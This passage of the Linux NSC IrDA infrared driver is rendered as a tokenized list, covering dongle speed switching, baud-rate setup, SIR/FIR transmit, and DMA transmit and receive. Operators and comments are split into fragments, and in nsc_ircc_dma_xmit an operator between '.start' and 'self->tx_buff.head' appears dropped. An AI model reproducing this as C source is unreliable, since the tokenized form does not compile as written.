"\"%", "s", "(", "),", "%", "s", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "0x62", ",", "iobase", "+", "MCR", ")", ";", "break", ";", "default", ":", "pr_debug", "(", "\"%", "s", "(", "),", "invalid", "dongle_id", "%", "#", "x", "\"", ",", "__func__", ",", "dongle_id", ")", ";", "}", "/", "*", "IRCFG1", ":", "IRSL1", "and", "2", "are", "set", "to", "IrDA", "mode", "*", "/", "outb", "(", "0x00", ",", "iobase", "+", "4", ")", ";", "/", "*", "Restore", "bank", "register", "*", "/", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "}", "/", "*", "set_up_dongle_interface", "*", "/", "/", "*", "*", "Function", "nsc_ircc_change_dongle_speed", "(", "iobase", ",", "speed", ",", "dongle_id", ")", "*", "*", "Change", "speed", "of", "the", "attach", "dongle", "*", "*", "/", "static", "void", "nsc_ircc_change_dongle_speed", "(", "int", "iobase", ",", "int", "speed", ",", "int", "dongle_id", ")", "{", "__u8", "bank", ";", "/", "*", "Save", "current", "bank", "*", "/", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "Select", "Bank", "7", "*", "/", "switch_bank", "(", "iobase", ",", "BANK7", ")", ";", "/", "*", "IRCFG1", ":", "set", "according", "to", "dongle_id", "*", "/", "switch", "(", "dongle_id", ")", "{", "case", "0x00", ":", "/", "*", "same", "as", "*", "/", "case", "0x01", ":", "/", "*", "Differential", "serial", "interface", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "not", "defined", "by", "irda", "yet", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "break", ";", "case", "0x02", ":", "/", "*", "same", "as", "*", "/", "case", "0x03", ":", "/", "*", "Reserved", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "not", "defined", "by", "irda", "yet", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "break", ";", "case", "0x04", ":", "/", "*", "Sharp", "RY5HD01", "*", "/", "break", ";", "case", "0x05", ":", "/", "*", "Reserved", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "not", "defined", "by", "irda", "yet", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "break", ";", "case", "0x06", ":", "/", "*", "Single", "-", "ended", "serial", "interface", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "not", "defined", "by", "irda", "yet", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "break", ";", "case", "0x07", ":", "/", "*", "Consumer", "-", "IR", "only", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "is", "not", "for", "IrDA", "mode", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "break", ";", "case", "0x08", ":", "/", "*", "HP", "HSDL", "-", "2300", ",", "HP", "HSDL", "-", "3600", "/", "HSDL", "-", "3610", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "outb", "(", "0x00", ",", "iobase", "+", "4", ")", ";", "if", "(", "speed", ">", "115200", ")", "outb", "(", "0x01", ",", "iobase", "+", "4", ")", ";", "break", ";", "case", "0x09", ":", "/", "*", "IBM31T1100", "or", "Temic", "TFDS6000", "/", "TFDS6500", "*", "/", "outb", "(", "0x01", ",", "iobase", "+", "4", ")", ";", "if", "(", "speed", "=", "=", "4000000", ")", "{", "/", "*", "There", "was", "a", "cli", "(", ")", "there", ",", "but", "we", "now", "are", "already", "*", "under", "spin_lock_irqsave", "(", ")", "-", "JeanII", "*", "/", "outb", "(", "0x81", ",", "iobase", "+", "4", ")", ";", "outb", "(", "0x80", ",", "iobase", "+", "4", ")", ";", "}", "else", "outb", "(", "0x00", ",", "iobase", "+", "4", ")", ";", "break", ";", "case", "0x0A", ":", "/", "*", "same", "as", "*", "/", "case", "0x0B", ":", "/", "*", "Reserved", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "not", "defined", "by", "irda", "yet", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "break", ";", "case", "0x0C", ":", "/", "*", "same", "as", "*", "/", "case", "0x0D", ":", "/", "*", "HP", "HSDL", "-", "1100", "/", "HSDL", "-", "2100", "*", "/", "break", ";", "case", "0x0E", ":", "/", "*", "Supports", "SIR", "Mode", "only", "*", "/", "break", ";", "case", "0x0F", ":", "/", "*", "No", "dongle", "connected", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", "is", "not", "for", "IrDA", "mode", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ");", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "0x62", ",", "iobase", "+", "MCR", ")", ";", "break", ";", "default", ":", "pr_debug", "(", "\"%", "s", "(", "),", "invalid", "data_rate", "\\", "n", "\"", ",", "__func__", ")", ";", "}", "/", "*", "Restore", "bank", "register", "*", "/", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "}", "/", "*", "*", "Function", "nsc_ircc_change_speed", "(", "self", ",", "baud", ")", "*", "*", "Change", "the", "speed", "of", "the", "device", "*", "*", "This", "function", "*", "must", "*", "be", "called", "with", "irq", "off", "and", "spin", "-", "lock", ".", "*", "/", "static", "__u8", "nsc_ircc_change_speed", "(", "struct", "nsc_ircc_cb", "*", "self", ",", "__u32", "speed", ")", "{", "struct", "net_device", "*", "dev", ";", "__u8", "mcr", "=", "MCR_SIR", ";", "int", "iobase", ";", "__u8", "bank", ";", "__u8", "ier", ";", "/", "*", "Interrupt", "enable", "register", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "speed", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "speed", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "0", ";", ");", "dev", "=", "self", "-", ">", "netdev", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "/", "*", "Update", "accounting", "for", "new", "speed", "*", "/", "self", "-", ">", "io", ".", "speed", "=", "speed", ";", "/", "*", "Save", "current", "bank", "*", "/", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "Disable", "interrupts", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "0", ",", "iobase", "+", "IER", ")", ";", "/", "*", "Select", "Bank", "2", "*", "/", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "outb", "(", "0x00", ",", "iobase", "+", "BGDH", ")", ";", "switch", "(", "speed", ")", "{", "case", "9600", ":", "outb", "(", "0x0c", ",", "iobase", "+", "BGDL", ")", ";", "break", ";", "case", "19200", ":", "outb", "(", "0x06", ",", "iobase", "+", "BGDL", ")", ";", "break", ";", "case", "38400", ":", "outb", "(", "0x03", ",", "iobase", "+", "BGDL", ")", ";", "break", ";", "case", "57600", ":", "outb", "(", "0x02", ",", "iobase", "+", "BGDL", ")", ";", "break", ";", "case", "115200", ":", "outb", "(", "0x01", ",", "iobase", "+", "BGDL", ")", ";", "break", ";", "case", "576000", ":", "switch_bank", "(", "iobase", ",", "BANK5", ")", ";", "/", "*", "IRCR2", ":", "MDRS", "is", "set", "*", "/", "outb", "(", "inb", "(", "iobase", "+", "4", ")", "|", "0x04", ",", "iobase", "+", "4", ")", ";", "mcr", "=", "MCR_MIR", ";", "pr_debug", "(", "\"%", "s", "(", "),", "handling", "baud", "of", "576000", "\\", "n", "\"", ",", "__func__", ")", ";", "break", ";", "case", "1152000", ":", "mcr", "=", "MCR_MIR", ";", "pr_debug", "(", "\"%", "s", "(", "),", "handling", "baud", "of", "1152000", "\\", "n", "\"", ",", "__func__", ")", ";", "break", ";", "case", "4000000", ":", "mcr", "=", "MCR_FIR", ";", "pr_debug", "(", "\"%", "s", "(", "),", "handling", "baud", "of", "4000000", "\\", "n", "\"", ",", "__func__", ")", ";", "break", ";", "default", ":", "mcr", "=", "MCR_FIR", ";", "pr_debug", "(", "\"%", "s", "(", "),", "unknown", "baud", "rate", "of", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "speed", ")", ";", "break", ";", "}", "/", "*", "Set", "appropriate", "speed", "mode", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "mcr", "|", "MCR_TX_DFR", ",", "iobase", "+", "MCR", ")", ";", "/", "*", "Give", "some", "hits", "to", "the", "transceiver", "*", "/", "nsc_ircc_change_dongle_speed", "(", "iobase", ",", "speed", ",", "self", "-", ">", "io", ".", "dongle_id", ")", ";", "/", "*", "Set", "FIFO", "threshold", "to", "TX17", ",", "RX16", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "0x00", ",", "iobase", "+", "FCR", ")", ";", "outb", "(", "FCR_FIFO_EN", ",", "iobase", "+", "FCR", ")", ";", "outb", "(", "FCR_RXTH", "|", "/", "*", "Set", "Rx", "FIFO", "threshold", "*", "/", "FCR_TXTH", "|", "/", "*", "Set", "Tx", "FIFO", "threshold", "*", "/", "FCR_TXSR", "|", "/", "*", "Reset", "Tx", "FIFO", "*", "/", "FCR_RXSR", "|", "/", "*", "Reset", "Rx", "FIFO", "*", "/", "FCR_FIFO_EN", ",", "/", "*", "Enable", "FIFOs", "*", "/", "iobase", "+", "FCR", ")", ";", "/", "*", "Set", "FIFO", "size", "to", "32", "*", "/", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "outb", "(", "EXCR2_RFSIZ", "|", "EXCR2_TFSIZ", ",", "iobase", "+", "EXCR2", ")", ";", "/", "*", "Enable", "some", "interrupts", "so", "we", "can", "receive", "frames", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "if", "(", "speed", ">", "115200", ")", "{", "/", "*", "Install", "FIR", "xmit", "handler", "*", "/", "dev", "-", ">", "netdev_ops", "=", "&", "nsc_ircc_fir_ops", ";", "ier", "=", "IER_SFIF_IE", ";", "nsc_ircc_dma_receive", "(", "self", ")", ";", "}", "else", "{", "/", "*", "Install", "SIR", "xmit", "handler", "*", "/", "dev", "-", ">", "netdev_ops", "=", "&", "nsc_ircc_sir_ops", ";", "ier", "=", "IER_RXHDL_IE", ";", "}", "/", "*", "Set", "our", "current", "interrupt", "mask", "*", "/", "outb", "(", "ier", ",", "iobase", "+", "IER", ")", ";", "/", "*", "Restore", "BSR", "*", "/", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "/", "*", "Make", "sure", "interrupt", "handlers", "keep", "the", "proper", "interrupt", "mask", "*", "/", "return", "ier", ";", "}", "/", "*", "*", "Function", "nsc_ircc_hard_xmit", "(", "skb", ",", "dev", ")", "*", "*", "Transmit", "the", "frame", "!", "*", "*", "/", "static", "netdev_tx_t", "nsc_ircc_hard_xmit_sir", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", "{", "struct", "nsc_ircc_cb", "*", "self", ";", "unsigned", "long", "flags", ";", "int", "iobase", ";", "__s32", "speed", ";", "__u8", "bank", ";", "self", "=", "netdev_priv", "(", "dev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "NETDEV_TX_OK", ";", ");", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "netif_stop_queue", "(", "dev", ")", ";", "/", "*", "Make", "sure", "tests", "*", "&", "speed", "change", "are", "atomic", "*", "/", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Check", "if", "we", "need", "to", "change", "the", "speed", "*", "/", "speed", "=", "irda_get_next_speed", "(", "skb", ")", ";", "if", "(", "(", "speed", "!", "=", "self", "-", ">", "io", ".", "speed", ")", "&", "&", "(", "speed", "!", "=", "-", "1", ")", ")", "{", "/", "*", "Check", "for", "empty", "frame", ".", "*", "/", "if", "(", "!", "skb", "-", ">", "len", ")", "{", "/", "*", "If", "we", "just", "sent", "a", "frame", ",", "we", "get", "called", "before", "*", "the", "last", "bytes", "get", "out", "(", "because", "of", "the", "SIR", "FIFO", ")", ".", "*", "If", "this", "is", "the", "case", ",", "let", "interrupt", "handler", "change", "*", "the", "speed", "itself", ".", "..", "Jean", "II", "*", "/", "if", "(", "self", "-", ">", "io", ".", "direction", "=", "=", "IO_RECV", ")", "{", "nsc_ircc_change_speed", "(", "self", ",", "speed", ")", ";", "/", "*", "TODO", ":", "For", "SIR", "-", ">", "SIR", ",", "the", "next", "packet", "*", "may", "get", "corrupted", "-", "Jean", "II", "*", "/", "netif_wake_queue", "(", "dev", ")", ";", "}", "else", "{", "self", "-", ">", "new_speed", "=", "speed", ";", "/", "*", "Queue", "will", "be", "restarted", "after", "speed", "change", "*", "to", "make", "sure", "packets", "gets", "through", "the", "*", "proper", "xmit", "handler", "-", "Jean", "II", "*", "/", "}", "netif_trans_update", "(", "dev", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "else", "self", "-", ">", "new_speed", "=", "speed", ";", "}", "/", "*", "Save", "current", "bank", "*", "/", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "self", "-", ">", "tx_buff", ".", "data", "=", "self", "-", ">", "tx_buff", ".", "head", ";", "self", "-", ">", "tx_buff", ".", "len", "=", "async_wrap_skb", "(", "skb", ",", "self", "-", ">", "tx_buff", ".", "data", ",", "self", "-", ">", "tx_buff", ".", "truesize", ")", ";", "dev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "self", "-", ">", "tx_buff", ".", "len", ";", "/", "*", "Add", "interrupt", "on", "tx", "low", "level", "(", "will", "fire", "immediately", ")", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "IER_TXLDL_IE", ",", "iobase", "+", "IER", ")", ";", "/", "*", "Restore", "bank", "register", "*", "/", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "netif_trans_update", "(", "dev", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "static", "netdev_tx_t", "nsc_ircc_hard_xmit_fir", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", "{", "struct", "nsc_ircc_cb", "*", "self", ";", "unsigned", "long", "flags", ";", "int", "iobase", ";", "__s32", "speed", ";", "__u8", "bank", ";", "int", "mtt", ",", "diff", ";", "self", "=", "netdev_priv", "(", "dev", ")", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "netif_stop_queue", "(", "dev", ")", ";", "/", "*", "Make", "sure", "tests", "*", "&", "speed", "change", "are", "atomic", "*", "/", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Check", "if", "we", "need", "to", "change", "the", "speed", "*", "/", "speed", "=", "irda_get_next_speed", "(", "skb", ")", ";", "if", "(", "(", "speed", "!", "=", "self", "-", ">", "io", ".", "speed", ")", "&", "&", "(", "speed", "!", "=", "-", "1", ")", ")", "{", "/", "*", "Check", "for", "empty", "frame", ".", "*", "/", "if", "(", "!", "skb", "-", ">", "len", ")", "{", "/", "*", "If", "we", "are", "currently", "transmitting", ",", "defer", "to", "*", "interrupt", "handler", ".", "-", "Jean", "II", "*", "/", "if", "(", "self", "-", ">", "tx_fifo", ".", "len", "=", "=", "0", ")", "{", "nsc_ircc_change_speed", "(", "self", ",", "speed", ")", ";", "netif_wake_queue", "(", "dev", ")", ";", "}", "else", "{", "self", "-", ">", "new_speed", "=", "speed", ";", "/", "*", "Keep", "queue", "stopped", ":", "*", "the", "speed", "change", "operation", "may", "change", "the", "*", "xmit", "handler", ",", "and", "we", "want", "to", "make", "sure", "*", "the", "next", "packet", "get", "through", "the", "proper", "*", "Tx", "path", ",", "so", "block", "the", "Tx", "queue", "until", "*", "the", "speed", "change", "has", "been", "done", ".", "*", "Jean", "II", "*", "/", "}", "netif_trans_update", "(", "dev", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "else", "{", "/", "*", "Change", "speed", "after", "current", "frame", "*", "/", "self", "-", ">", "new_speed", "=", "speed", ";", "}", "}", "/", "*", "Save", "current", "bank", "*", "/", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "Register", "and", "copy", "this", "frame", "to", "DMA", "memory", "*", "/", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "free", "]", ".", "start", "=", "self", "-", ">", "tx_fifo", ".", "tail", ";", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "free", "]", ".", "len", "=", "skb", "-", ">", "len", ";", "self", "-", ">", "tx_fifo", ".", "tail", "+", "=", "skb", "-", ">", "len", ";", "dev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "skb", "-", ">", "len", ";", "skb_copy_from_linear_data", "(", "skb", ",", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "free", "]", ".", "start", ",", "skb", "-", ">", "len", ")", ";", "self", "-", ">", "tx_fifo", ".", "len", "+", "+;", "self", "-", ">", "tx_fifo", ".", "free", "+", "+;", "/", "*", "Start", "transmit", "only", "if", "there", "is", "currently", "no", "transmit", "going", "on", "*", "/", "if", "(", "self", "-", ">", "tx_fifo", ".", "len", "=", "=", "1", ")", "{", "/", "*", "Check", "if", "we", "must", "wait", "the", "min", "turn", "time", "or", "not", "*", "/", "mtt", "=", "irda_get_mtt", "(", "skb", ")", ";", "if", "(", "mtt", ")", "{", "/", "*", "Check", "how", "much", "time", "we", "have", "used", "already", "*", "/", "diff", "=", "ktime_us_delta", "(", "ktime_get", "(", "),", "self", "-", ">", "stamp", ")", ";", "/", "*", "Check", "if", "the", "mtt", "is", "larger", "than", "the", "time", "we", "have", "*", "already", "used", "by", "all", "the", "protocol", "processing", "*", "/", "if", "(", "mtt", ">", "diff", ")", "{", "mtt", "-", "=", "diff", ";", "/", "*", "*", "Use", "timer", "if", "delay", "larger", "than", "125", "us", ",", "and", "*", "use", "udelay", "for", "smaller", "values", "which", "should", "*", "be", "acceptable", "*", "/", "if", "(", "mtt", ">", "125", ")", "{", "/", "*", "Adjust", "for", "timer", "resolution", "*", "/", "mtt", "=", "mtt", "/", "125", ";", "/", "*", "Setup", "timer", "*", "/", "switch_bank", "(", "iobase", ",", "BANK4", ")", ";", "outb", "(", "mtt", "&", "0xff", ",", "iobase", "+", "TMRL", ")", ";", "outb", "(", "(", "mtt", ">", ">", "8", ")", "&", "0x0f", ",", "iobase", "+", "TMRH", ")", ";", "/", "*", "Start", "timer", "*", "/", "outb", "(", "IRCR1_TMR_EN", ",", "iobase", "+", "IRCR1", ")", ";", "self", "-", ">", "io", ".", "direction", "=", "IO_XMIT", ";", "/", "*", "Enable", "timer", "interrupt", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "IER_TMR_IE", ",", "iobase", "+", "IER", ")", ";", "/", "*", "Timer", "will", "take", "care", "of", "the", "rest", "*", "/", "goto", "out", ";", "}", "else", "udelay", "(", "mtt", ")", ";", "}", "}", "/", "*", "Enable", "DMA", "interrupt", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "IER_DMA_IE", ",", "iobase", "+", "IER", ")", ";", "/", "*", "Transmit", "frame", "*", "/", "nsc_ircc_dma_xmit", "(", "self", ",", "iobase", ")", ";", "}", "out", ":", "/", "*", "Not", "busy", "transmitting", "anymore", "if", "window", "is", "not", "full", ",", "*", "and", "if", "we", "don", "'", "t", "need", "to", "change", "speed", "*", "/", "if", "(", "(", "self", "-", ">", "tx_fifo", ".", "free", "<", "MAX_TX_WINDOW", ")", "&", "&", "(", "self", "-", ">", "new_speed", "=", "=", "0", ")", ")", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "/", "*", "Restore", "bank", "register", "*", "/", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "netif_trans_update", "(", "dev", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "/", "*", "*", "Function", "nsc_ircc_dma_xmit", "(", "self", ",", "iobase", ")", "*", "*", "Transmit", "data", "using", "DMA", "*", "*", "/", "static", "void", "nsc_ircc_dma_xmit", "(", "struct", "nsc_ircc_cb", "*", "self", ",", "int", "iobase", ")", "{", "int", "bsr", ";", "/", "*", "Save", "current", "bank", "*", "/", "bsr", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "Disable", "DMA", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "inb", "(", "iobase", "+", "MCR", ")", "&", "~", "MCR_DMA_EN", ",", "iobase", "+", "MCR", ")", ";", "self", "-", ">", "io", ".", "direction", "=", "IO_XMIT", ";", "/", "*", "Choose", "transmit", "DMA", "channel", "*", "/", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "outb", "(", "ECR1_DMASWP", "|", "ECR1_DMANF", "|", "ECR1_EXT_SL", ",", "iobase", "+", "ECR1", ")", ";", "irda_setup_dma", "(", "self", "-", ">", "io", ".", "dma", ",", "(", "(", "u8", "*", ")", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "ptr", "]", ".", "start", "self", "-", ">", "tx_buff", ".", "head", ")", "+", "self", "-", ">", "tx_buff_dma", ",", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "ptr", "]", ".", "len", ",", "DMA_TX_MODE", ")", ";", "/", "*", "Enable", "DMA", "and", "SIR", "interaction", "pulse", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "inb", "(", "iobase", "+", "MCR", ")", "|", "MCR_TX_DFR", "|", "MCR_DMA_EN", "|", "MCR_IR_PLS", ",", "iobase", "+", "MCR", ")", ";", "/", "*", "Restore", "bank", "register", "*", "/", "outb", "(", "bsr", ",", "iobase", "+", "BSR", ")", ";", "}", "/", "*", "*", "Function", "nsc_ircc_pio_xmit", "(", "self", ",", "iobase", ")", "*", "*", "Transmit", "data", "using", "PIO", ".", "Returns", "the", "number", "of", "bytes", "that", "actually", "*", "got", "transferred", "*", "*", "/", "static", "int", "nsc_ircc_pio_write", "(", "int", "iobase", ",", "__u8", "*", "buf", ",", "int", "len", ",", "int", "fifo_size", ")", "{", "int", "actual", "=", "0", ";", "__u8", "bank", ";", "/", "*", "Save", "current", "bank", "*", "/", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "if", "(", "!(", "inb_p", "(", "iobase", "+", "LSR", ")", "&", "LSR_TXEMP", ")", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "warning", ",", "FIFO", "not", "empty", "yet", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "/", "*", "FIFO", "may", "still", "be", "filled", "to", "the", "Tx", "interrupt", "threshold", "*", "/", "fifo_size", "-", "=", "17", ";", "}", "/", "*", "Fill", "FIFO", "with", "current", "frame", "*", "/", "while", "(", "(", "fifo_size", "-", "-", ">", "0", ")", "&", "&", "(", "actual", "<", "len", ")", ")", "{", "/", "*", "Transmit", "next", "byte", "*", "/", "outb", "(", "buf", "[", "actual", "+", "+]", ",", "iobase", "+", "TXD", ")", ";", "}", "pr_debug", "(", "\"%", "s", "(", "),", "fifo_size", "%", "d", ";", "%", "d", "sent", "of", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "fifo_size", ",", "actual", ",", "len", ")", ";", "/", "*", "Restore", "bank", "*", "/", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "return", "actual", ";", "}", "/", "*", "*", "Function", "nsc_ircc_dma_xmit_complete", "(", "self", ")", "*", "*", "The", "transfer", "of", "a", "frame", "in", "finished", ".", "This", "function", "will", "only", "be", "called", "*", "by", "the", "interrupt", "handler", "*", "*", "/", "static", "int", "nsc_ircc_dma_xmit_complete", "(", "struct", "nsc_ircc_cb", "*", "self", ")", "{", "int", "iobase", ";", "__u8", "bank", ";", "int", "ret", "=", "TRUE", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "/", "*", "Save", "current", "bank", "*", "/", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "Disable", "DMA", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "inb", "(", "iobase", "+", "MCR", ")", "&", "~", "MCR_DMA_EN", ",", "iobase", "+", "MCR", ")", ";", "/", "*", "Check", "for", "underrun", "!", "*", "/", "if", "(", "inb", "(", "iobase", "+", "ASCR", ")", "&", "ASCR_TXUR", ")", "{", "self", "-", ">", "netdev", "-", ">", "stats", ".", "tx_errors", "+", "+;", "self", "-", ">", "netdev", "-", ">", "stats", ".", "tx_fifo_errors", "+", "+;", "/", "*", "Clear", "bit", ",", "by", "writing", "1", "into", "it", "*", "/", "outb", "(", "ASCR_TXUR", ",", "iobase", "+", "ASCR", ")", ";", "}", "else", "{", "self", "-", ">", "netdev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "}", "/", "*", "Finished", "with", "this", "frame", ",", "so", "prepare", "for", "next", "*", "/", "self", "-", ">", "tx_fifo", ".", "ptr", "+", "+;", "self", "-", ">", "tx_fifo", ".", "len", "-", "-;", "/", "*", "Any", "frames", "to", "be", "sent", "back", "-", "to", "-", "back", "?", "*", "/", "if", "(", "self", "-", ">", "tx_fifo", ".", "len", ")", "{", "nsc_ircc_dma_xmit", "(", "self", ",", "iobase", ")", ";", "/", "*", "Not", "finished", "yet", "!", "*", "/", "ret", "=", "FALSE", ";", "}", "else", "{", "/", "*", "Reset", "Tx", "FIFO", "info", "*", "/", "self", "-", ">", "tx_fifo", ".", "len", "=", "self", "-", ">", "tx_fifo", ".", "ptr", "=", "self", "-", ">", "tx_fifo", ".", "free", "=", "0", ";", "self", "-", ">", "tx_fifo", ".", "tail", "=", "self", "-", ">", "tx_buff", ".", "head", ";", "}", "/", "*", "Make", "sure", "we", "have", "room", "for", "more", "frames", "and", "*", "that", "we", "don", "'", "t", "need", "to", "change", "speed", "*", "/", "if", "(", "(", "self", "-", ">", "tx_fifo", ".", "free", "<", "MAX_TX_WINDOW", ")", "&", "&", "(", "self", "-", ">", "new_speed", "=", "=", "0", ")", ")", "{", "/", "*", "Not", "busy", "transmitting", "anymore", "*", "/", "/", "*", "Tell", "the", "network", "layer", ",", "that", "we", "can", "accept", "more", "frames", "*", "/", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "}", "/", "*", "Restore", "bank", "*", "/", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "return", "ret", ";", "}", "/", "*", "*", "Function", "nsc_ircc_dma_receive", "(", "self", ")", "*", "*", "Get", "ready", "for", "receiving", "a", "frame", ".", "The", "device", "will", "initiate", "a", "DMA", "*", "if", "it", "starts", "to", "receive", "a", "frame", ".", "*", "*", "/", "static", "int", "nsc_ircc_dma_receive", "(", "struct", "nsc_ircc_cb", "*", "self", ")", "{", "int", "iobase", ";", "__u8", "bsr", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "/", "*", "Reset", "Tx", "FIFO", "info", "*", "/", "self", "-", ">", "tx_fifo", ".", "len", "=", "self", "-", ">", "tx_fifo", ".", "ptr", "=", "self", "-", ">", "tx_fifo", ".", "free", "=", "0", ";", "self", "-", ">", "tx_fifo", ".", "tail", "=", "self", "-", ">", "tx_buff", ".", "head", ";", "/", "*", "Save", "current", "bank", "*", "/", "bsr", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "Disable", "DMA", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "inb", "(", "iobase", "+", "MCR", ")", "&", "~", "MCR_DMA_EN", ",", "iobase", "+", "MCR", ")", ";", "/", "*", "Choose", "DMA", "Rx", ",", "DMA", "Fairness", ",", "and", "Advanced", "mode", "*", "/", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "outb", "(", "ECR1_DMANF", "|", "ECR1_EXT_SL", ",", "iobase", "+", "ECR1", ")", ";", "self", "-", ">", "io", ".", "direction", "=", "IO_RECV", ";", "self", "-", ">", "rx_buff", ".", "data", "=", "self", "-", ">", "rx_buff", ".", "head", ";", "/", "*", "Reset", "Rx", "FIFO", ".", "This", "will", "also", "flush", "the", "ST_FIFO", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "FCR_RXSR", "|", "FCR_FIFO_EN", ",", "iobase", "+", "FCR", ")", ";", "self", "-", ">", "st_fifo", ".", "len", "=", "self", "-", ">", "st_fifo", ".", "pending_bytes", "=", "0", ";", "self", "-", ">", "st_fifo", ".", "tail", "=", "self", "-", ">", "st_fifo", ".", "head", "=", "0", ";", "irda_setup_dma", "(", "self", "-", ">", "io", ".", "dma", ",", "self", "-", ">", "rx_buff_dma", ",", "self", "-", ">", "rx_buff", ".", "truesize", ",", "DMA_RX_MODE", ")", 